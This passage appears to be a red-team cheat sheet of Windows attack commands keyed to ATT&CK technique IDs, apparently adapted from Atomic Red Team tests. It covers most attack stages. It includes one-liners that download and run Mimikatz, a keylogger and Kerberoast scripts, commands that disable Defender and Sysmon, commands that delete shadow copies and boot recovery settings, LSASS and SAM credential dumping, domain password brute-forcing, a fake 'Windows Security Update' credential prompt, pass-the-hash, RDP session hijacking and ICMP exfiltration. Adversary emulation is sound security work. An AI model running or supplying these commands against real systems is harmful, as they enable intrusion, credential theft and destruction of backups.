bitsadmin.exe  /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Windows\Temp\output

3.  T1191 CMSTP
cmstp.exe /s C:\tests\T1191\T1191.inf

4.  T1500 Compile After Delivery
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library C:\tests\T1121\T1121.cs

5.  T1223 Compiled HTML File
hh.exe C:\tests\T1223\T1223.chm

6.  T1122 Component Object Model Hijacking - Admin - TODO
reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Classes\mscfile\shell\open\command" /v "(Default)" /t REG_EXPAND_SZ /d "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe" /f
%SystemRoot%\system32\mmc.exe "%1" %*

7.  T1196 Control Panel Items
reg add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Control Panel\Cpls" /v cmd.cpl /t REG_SZ /d "C:\tests\cmd.cpl"

8.  T1207 DCShadow - DA

9.  T1140 Deobfuscate/Decode Files or Information
certutil.exe -encode C:\Windows\System32\cmd.exe file.txt
certutil.exe -decode file.txt C:\tests\cmd.exe

10. T1089 Disabling Security Tools - Admin
fltmc.exe unload SysmonDrv
Set-MpPreference -DisableRealtimeMonitoring $true

11. T1107 File Deletion
Delete VSS - wmic
wmic shadowcopy call create Volume='C:\'
vssadmin.exe Delete Shadows /All /Quiet
wmic shadowcopy delete

bcdedit - remove boot-time recovery measures.
bcdedit /set {default} bootstatuspolicy ignoreallfailures
bcdedit /set {default} recoveryenabled no

wbadmin - Windows Backup catalogs
wbadmin delete catalog -quiet

12. T1222 File Permissions Modification
takeown.exe /f .\nc3.exe
cacls.exe .\nc3.exe /grant Everyone:F
icacls.exe .\nc3.exe /grant Everyone:F
attrib.exe -r .\nc3.exe

13. T1006 File System Logical Offsets - Admin

14. T1158 Hidden Files and Directories
attrib.exe +s system.file
attrib.exe +h hidden.file

echo "test" > test.txt:ads.txt
echo "test" > :ads.txt
dir /s /r | find ":$DATA"

echo "test" > test.txt | set-content -path test.txt -stream ads.txt -value "test"
set-content -path test.txt -stream ads.txt -value "test2"
ls -Recurse | %{ gi $_.Fullname -stream *} | where stream -ne ':$Data' | Select-Object pschildname

15. T1183 Image File Execution Options Injection- Admin - Cleanup
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v Debugger /d "cmd.exe"

REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\notepad.exe" /v GlobalFlag /t REG_DWORD /d 512 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v ReportingMode /t REG_DWORD /d 1 
REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\SilentProcessExit\notepad.exe" /v MonitorProcess /d "cmd.exe"

16. T1202 Indirect Command Execution
pcalua.exe -a calc.exe
forfiles /p c:\windows\system32 /m notepad.exe /c calc.exe

17. T1130 Install Root Certificate
certutil.exe -addstore -f -user Root C:\tests\T1130\www.microsoft.com.cer
view if added
powershell: ls Cert:\CurrentUser\Root
Get-ChildItem Cert:\CurrentUser\Root\64D2A8CD0724C1D82B4BE2D41A0F1EFF2D28D6C9 | Remove-Item

Import-Certificate -FilePath C:\temp\www.microsoft.com.cer -CertStoreLocation Cert:\CurrentUser\Root\

18. T1118 InstallUtil
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /target:library C:\tests\T1118\T1118.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\InstallUtil.exe /logfile= /LogToConwsole=false /U .\T1118.dll
  
19. T1036 Masquerading
cmd.exe /c copy %SystemRoot%\System32\cmd.exe %SystemRoot%\Temp\lsass.exe
cmd.exe /c %SystemRoot%\Temp\lsass.exe

20. T1112 Modify Registry
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f

21. T1170 Mshta
mshta.exe javascript:a=(GetObject('script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1170/mshta.sct')).Exec();close();

22. T1096 NTFS File Attributes
echo "empty file" > c:\temp\file.txt
makecab c:\teste\procexp.exe c:\temp\procexp.cab
extrac32 C:\temp\procexp.cab c:\temp\file.txt:procexp.exe
wmic process call create '"c:\temp\file.txt:procexp.exe"'

23. T1121 Regsvcs/Regasm
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /r:System.EnterpriseServices.dll /target:library C:\tests\T1121\T1121.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U .\T1121.dll

24. T1085 Rundll32 - Windows Defender
rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1085/T1085.sct").Exec();"

25. T1218 Signed Binary Proxy Execution
msiexec /y C:\tests\T1218\T1218.dll
mavinject.exe 1000 /INJECTRUNNING C:\tests\T1218\T1218.dll
odbcconf.exe /S /A {REGSVR "C:\tests\T1218\T1218.dll"}

29. T1099 Timestomp
Get-ChildItem C:\temp\file.txt | % { $_.CreationTime = "1970-01-01 00:00:00" }
Get-ChildItem C:\temp\file.txt | % { $_.LastWriteTime = "1970-01-01 00:00:00" }
Get-ChildItem C:\temp\file.txt | % { $_.LastAccessTime = "1970-01-01 00:00:00" }

30. T1127 Trusted Developer Utilities
C:\Windows\Microsoft.NET\Framework\v4.0.30319\msbuild.exe C:\tests\T1127\T1127.csproj

31. T1220 XSL Script Processing
C:\tests\msxsl.exe C:\tests\T1220\msxsl-xmlfile.xml C:\tests\T1220\msxsl-script.xsl
C:\tests\msxsl.exe https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxsl-xmlfile.xml https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1220/src/msxsl-script.xsl


Credential Access
1.  T1098 Account Manipulation - Admin
$Password = Read-Host -AsSecureString
New-LocalUser "NEW_ACCOUNT_NAME" -Password $Password -FullName "USER_FULL_NAME" -Description "Description of this account."
Add-LocalGroupMember -Group "Administrators" -Member "NEW_ACCOUNT_NAME"

2.  T1110 Brute Force
FOR /F %i IN ('wmic /NAMESPACE:\\root\directory\ldap PATH ds_user GET ds_samaccountname') DO ECHO %i >> users.txt
echo "test"
echo "Passw0rd!" > passwords.txt
echo "Aprilie2019!" >> passwords.txt
echo "Aprilie2019@" >> passwords.txt
echo "Martie2019!" >> passwords.txt
echo "Martie2019@" >> passwords.txt
echo "1234$#@Q" >> passwords.txt
@FOR /F %n in (users.txt) DO @FOR /F %p in (passwords.txt) DO @net use #{remote_host} /user:#{domain}\%n %p 1>NUL 2>&1 && @echo [*] %n:%p && @net use /delete #{remote_host} > NUL

3.  T1003 Credential Dumping - Administrators
https://github.com/SecureThisShit/Amsi-Bypass-Powershell
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/4c7a2016fc7931cd37273c5d8e17b16d959867b3/Exfiltration/Invoke-Mimikatz.ps1'); Invoke-Mimikatz | clip

reg save HKLM\sam sam
reg save HKLM\system system
reg save HKLM\security security

procdump.exe -accepteula -ma lsass.exe lsass_dump.dmp

Task manager > Local Security Authority Process > dump

4.  T1081 Credentials in Files
import-module C:\tests\T1081
invoke-mimikittenz

5.  T1214 - Credentials in Registry
reg query HKLM /f password /t REG_SZ /s
reg query HKCU /f password /t REG_SZ /s

6.  T1179 Hooking - Administrators
mavinject $pid /INJECTRUNNING C:\tests\T1179\T1179x64.dll
curl -UseBasicParsing https://www.example.com

7.  T1056 Input Capture - Admin
https://github.com/SecureThisShit/Amsi-Bypass-Powershell
iex (new-object net.webclient).downloadstring('https://gist.githubusercontent.com/dasgoll/7ca1c059dd3b3fbc7277/raw/e4e3a530589dac67ab6c4c2428ea90de93b86018/gistfile1.txt'); Start-KeyLogger
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1'); Get-TimedScreenshot -Path c:\temp\ -Interval 30 -EndTime 14:00

8.  T1141 Input Prompt
$cred = $host.UI.PromptForCredential('Windows Security Update', '',[Environment]::UserName, [Environment]::UserDomainName); echo $cred.GetNetworkCredential().Password;

9.  T1208 Kerberoasting
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Kerberoast.ps1'); Invoke-Kerberoast -erroraction silentlycontinue -Verbose

10.  T1171 LLMNR/NBT-NS Poisoning and Relay
https://github.com/Kevin-Robertson/Inveigh
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/Kevin-Robertson/Inveigh/master/Inveigh.ps1'); Invoke-Inveigh -ConsoleOutput Y

11. T1040 Network Sniffing - Admin
netsh trace start scenario=InternetClient,InternetServer,NetConnection globalLevel=win:Verbose capture=yes report=yes traceFile=C:\temp\trace001.etl
netsh trace stop

12. T1174 Password Filter DLL - Admin
copy C:\tests\T1174\evilpwfilter.dll C:\Windows\System32
reg add "hklm\system\currentcontrolset\control\lsa" /v "notification packages" /d scecli\0evilpwfilter /t reg_multi_sz
https://ired.team/offensive-security/credential-access-and-credential-dumping/t1174-password-filter-dll

13. T1145 Private Keys
echo "ATOMICTESTS" > %windir%\cert.key
dir c:\ /b /s .key | findstr /e .key
+ Mimikatz

14. T1111 Two-Factor Authentication Interception - Admin
Mimikatz


Discovery
1. T1087 - Account Discovery
net user
net user /domain
dir c:\Users\
cmdkey.exe /list
net localgroup "Users"
net localgroup

get-localgroupmembers -group Users
ls C:/Users
get-childitem C:\Users\
dir C:\Users\
get-aduser -filter *
get-localgroup

query user

2. T1010 Application Window Discovery
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe -out:T1010.exe C:\teste\T1010\T1010.cs 
T1010.exe

3. T1482 Domain Trust Discovery
dsquery * -filter "(objectClass=trustedDomain)" -attr *
nltest /domain_trusts

4. T1083 File and Directory Discoveryry
dir /s c:\ >> %temp%\download
dir /s "c:\Documents and Settings" >> %temp%\download
dir /s "c:\Program Files\" >> %temp%\download
dir /s d:\ >> %temp%\download
dir "%systemdrive%\Users\*.*" >> %temp%\download
dir "%userprofile%\AppData\Roaming\Microsoft\Windows\Recent\*.*" >> %temp%\download
dir "%userprofile%\Desktop\*.*" >> %temp%\download
tree /F >> %temp%\download

7. T1046 Network Service Scanning
Invoke-Portscan -Hosts 192.168.1.1/24 -T 4 -TopPorts 25 -oA localnet

8. T1135 Network Share Discovery
net view \\#{computer_name}
get-smbshare -Name #{computer_name}

10. T1040 Network Sniffing - Admin

11. T1201 Password Policy Discovery
net accounts
net accounts /domain

12. T1120 Peripheral Device Discovery
Get-PnpDevice

13. T1069 Permission Groups Discovery
net localgroup
net group /domain

14. T1057 Process Discovery
tasklist

15. T1012 Query Registry
reg query "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows"
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServicesOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunServices
reg query HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
reg query HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
reg query HKLM\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\\Shell
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\ShellServiceObjectDelayLoad
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\RunOnceEx
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce
reg query HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run
reg query hklm\system\currentcontrolset\services /s | findstr ImagePath 2>nul | findstr /Ri ".*\.sys$"
reg Query HKLM\Software\Microsoft\Windows\CurrentVersion\Run
reg save HKLM\Security security.hive
reg save HKLM\System system.hive
reg save HKLM\SAM sam.hive

16. T1018 Remote System Discovery
net view /domain
net view
for /l %i in (1,1,254) do ping -n 1 -w 100 192.168.1.%i
arp -a

17. T1063 Security Software Discovery
netsh.exe advfirewall firewall show all profiles
tasklist.exe
tasklist.exe | findstr /i virus
tasklist.exe | findstr /i cb
tasklist.exe | findstr /i defender
tasklist.exe | findstr /i cylance

- Sysmon Service
fltmc.exe | findstr.exe 385201

18. T1082 System Information Discovery
systeminfo
reg query HKLM\SYSTEM\CurrentControlSet\Services\Disk\Enum

19. T1016 System Network Configuration Discovery
ipconfig /all
netsh interface show
arp -a
nbtstat -n
net config

20. T1049 System Network Connections Discovery
netstat
net use
net sessions

Get-NetTCPConnection

21. T1033 System Owner/User Discovery
cmd.exe /C whoami
wmic useraccount get /ALL
quser /SERVER:"localhost"
quser
qwinsta.exe" /server:localhost
qwinsta.exe
for /F "tokens=1,2" %i in ('qwinsta /server:localhost ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt
@FOR /F %n in (computers.txt) DO @FOR /F "tokens=1,2" %i in ('qwinsta /server:%n ^| findstr "Active Disc"') do @echo %i | find /v "#" | find /v "console" || echo %j > usernames.txt

22. T1007 System Service Discovery
tasklist.exe
sc query
sc query state= all
sc start svchost.exe
sc stop svchost.exe
wmic service where (displayname like "svchost.exe") get name

net.exe start 

23. T1124 System Time Discovery
net time \\localhost
w32tm /tz

Get-Date


lateral-movement
1. T1037 Logon Scripts
REG.exe ADD HKCU\Environment /v UserInitMprLogonScript /t REG_MULTI_SZ /d "cmd.exe /c calc.exe"

2. T1075 Pass the Hash
sekurlsa::pth /user:#{user_name} /domain:#{domain} /ntlm:#{ntlm}

3. T1097 Pass the Ticket
kerberos::ptt #{user_name}@#{domain}

4. T1076 - Remote Desktop Protocol - as system
query user
sc.exe create sesshijack binpath= "cmd.exe /k tscon [user-id] /dest:rdp-tcp#55"
net start sesshijack
sc.exe delete sesshijack

5. T1105 Remote File Copy
cmd /c certutil -urlcache -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt out.txt

$datePath = "certutil-$(Get-Date -format yyyy_MM_dd_HH_mm)"
New-Item -Path $datePath -ItemType Directory
Set-Location $datePath
certutil -verifyctl -split -f https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/LICENSE.txt
Get-ChildItem | Where-Object {$_.Name -notlike "*.txt"} | Foreach-Object { Move-Item $_.Name -Destination out2.txt }

6. T1077 Windows Admin Shares
cmd.exe /c "net use \\#{computer_name}\C$ #{password} /u:#{user_name}"

New-PSDrive -name G -psprovider filesystem -root \\#{computer_name}\C$

7. T1028 Windows Remote Management
Enable-PSRemoting -Force

powershell.exe [activator]::CreateInstance([type]::GetTypeFromProgID("MMC20.application","#{computer_name}")).Documnet.ActiveView.ExecuteShellCommand("c:\windows\system32\calc.exe", $null, $null, "7")

wmic /user:#{user_name} /password:#{password} /node:#{computer_name} process call create "C:\Windows\system32\reg.exe add \"HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe\" /v \"Debugger\" /t REG_SZ /d \"cmd.exe\" /f"

psexec \\host -u domain\user -p password -s cmd.exe

invoke-command -computer_name #{host_name} -scriptblock {ifconfig}


Collection
1.  T1123 Audio Capture
SoundRecorder /FILE out.wav /DURATION 30

New-Item "$($profile | split-path)\Modules\AudioDeviceCmdlets" -Type directory -Force
Copy-Item "C:\Path\to\AudioDeviceCmdlets.dll" "$($profile | split-path)\Modules\AudioDeviceCmdlets\AudioDeviceCmdlets.dll"
Set-Location "$($profile | Split-Path)\Modules\AudioDeviceCmdlets"
Get-ChildItem | Unblock-File
Import-Module AudioDeviceCmdlets
Get-AudioDevice -List 
Get-AudioDevice -Recording

2.  T1119 - Automated Collection
dir c: /b /s .docx | findstr /e .docx
for /R c: %f in (*.docx) do copy %f c:\temp\

Get-ChildItem -Recurse -Include *.doc | % {Copy-Item $_.FullName -destination c:\temp}

4. T1115 - Clipboard Data
dir | clip
clip < readme.txt

echo Get-Process | clip
Get-Clipboard | iex

5.  T1056 Input Capture - Admin
https://github.com/SecureThisShit/Amsi-Bypass-Powershell
iex (new-object net.webclient).downloadstring('https://gist.githubusercontent.com/dasgoll/7ca1c059dd3b3fbc7277/raw/e4e3a530589dac67ab6c4c2428ea90de93b86018/gistfile1.txt'); Start-KeyLogger
iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Exfiltration/Get-TimedScreenshot.ps1'); Get-TimedScreenshot -Path c:\temp\ -Interval 30 -EndTime 14:00

6.  T1113 Screen Capture
[Reflection.Assembly]::LoadWithPartialName("System.Drawing")
function screenshot([Drawing.Rectangle]$bounds, $path) {
   $bmp = New-Object Drawing.Bitmap $bounds.width, $bounds.height
   $graphics = [Drawing.Graphics]::FromImage($bmp)

   $graphics.CopyFromScreen($bounds.Location, [Drawing.Point]::Empty, $bounds.size)

   $bmp.Save($path)

   $graphics.Dispose()
   $bmp.Dispose()
}

$bounds = [Drawing.Rectangle]::FromLTRB(0, 0, 1000, 900)
screenshot $bounds "C:\screenshot.png"


7. T1114 - Email Collection
.\Get-Inbox.ps1


Exfiltration
1. T1002 Data Compressed
dir C:* -Recurse | Compress-Archive -DestinationPath C:\teste\Data.zip

2. T1022 Data Encrypted
path=%path%;"C:\Program Files (x86)\winzip"
mkdir ./tmp/victim-files
cd ./tmp/victim-files
echo "This file will be encrypted" > ./encrypted_file.txt
winzip32 -min -a -s"hello" archive.zip *
dir

3. T1048 Exfiltration Over Alternative Protocol
$ping = New-Object System.Net.Networkinformation.ping; foreach($Data in Get-Content -Path #{input_file} -Encoding Byte -ReadCount 1024) { $ping.Send("#{ip_address}", 1500, $Data) }
DNS
